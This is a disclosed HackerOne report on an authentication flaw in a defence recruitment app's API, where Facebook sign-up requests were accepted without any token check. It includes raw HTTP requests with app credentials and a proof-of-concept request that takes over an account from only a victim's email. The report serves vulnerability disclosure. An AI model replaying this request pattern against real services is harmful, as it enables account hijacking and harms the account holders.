---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '240821'
original_report_id: '240821'
title: Ability To Takeover any account by Emaill.
weakness: Privilege Escalation
team_handle: radancy
created_at: '2017-06-16T20:50:56.335Z'
disclosed_at: '2019-07-10T15:23:05.522Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 168
tags:
- hackerone
- privilege-escalation
---

# Ability To Takeover any account by Emaill.

## Metadata

- HackerOne Report ID: 240821
- Weakness: Privilege Escalation
- Program: radancy
- Disclosed At: 2019-07-10T15:23:05.522Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,
I've found that your api ```api.werkenbijdefensie.nl``` for your ```mijn defensie``` Application do not authenticate Facebook users' probably.
Your application doesn't check the Facebook authentication token at all, which makes any attacker able to takeover any account just by using any valid user's email address.

###More Details:
Here's the application request to auth facebook users:
█████
```http
POST /v1.1/users/sign_up_by_channel HTTP/1.1
X-app-id: uiq3kjqbpes56os7eqxlky3f
X-app-token: 4lb93ExKv7ClEQR6iCUaH8h3n7qSCiNc
Content-Type: application/x-www-form-urlencoded
Content-Length: 513
Host: api.werkenbijdefensie.nl
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/3.2.0

channel=Facebook
&user[uid]=███
&user[info][email]=███████
&user[info][first_name]=Ahmed&user[info][last_name]=██████
&user[info][name]=Ahmed █████&user[info][birthday]=09/23/1996
&user[credentials]token]=EAAE8cZCItzkcBAAXYQqnQ5YZB1LqFCzTMrQL4xrYOZAAKkuxkcZAa4sAt3TzwVRMlF4wxV30obzbZCqVG8XDm41yyIWv2wCysHa846rNKXQfRYAtZADHiNZAZA0ZBd6U9GnSJYZCg1RCCgVkOS8ywWjEHeuaKTFvgFe6yeTuPwCAZAhZAIhCatZB0dqO3HOK065qDSRWMxROqzFWndwZDZD
&user[credentials][expires]=true
&user[credentials][expires_at]=1502824792036
```
1. ```user[uid]=██████``` is user's facebook id.
check this > https://www.facebook.com/████
2.  ```user[info][email]``` > is my facebook account's email.
3. ```&user[credentials]token]``` The authentication token.
4. the reset information aren't important
-------
Here's a response example:

```http
HTTP/1.1 201 Created
Server: nginx
Date: Fri, 16 Jun 2017 20:28:40 GMT
Content-Type: application/json
Content-Length: 164
Connection: keep-alive
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-XSS-Protection: 1; mode=block
X-Permitted-Cross-Domain-Policies: master-only
Strict-Transport-Security: max-age=31536000;

{"id":"5937d576b5164f04fce31d56","token":"11ef25eb5cdb7e392d502c25ba8f24bfb4e85e55f24208795a49277d0cea2c50","account_status":"confirmed","email_status":"confirmed"}
```
- The token in response is being used to authenticate user while exploring the application as following:  ████

###POC:
You can preform a request as shown and still get a valid token based on my email or any other valid email on your system.
The request to get token : ████████
The request with token : ███

```http
POST /v1.1/users/sign_up_by_channel HTTP/1.1
X-app-id: uiq3kjqbpes56os7eqxlky3f
X-app-token: 4lb93ExKv7ClEQR6iCUaH8h3n7qSCiNc
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Host: api.werkenbijdefensie.nl
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/3.2.0

channel=Facebook&user[uid]={AnyNumbers}&user[info][email]=victim@email.com
```

Let me know if you need more information or a video to explain it more.

Best Regards,
@exr

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
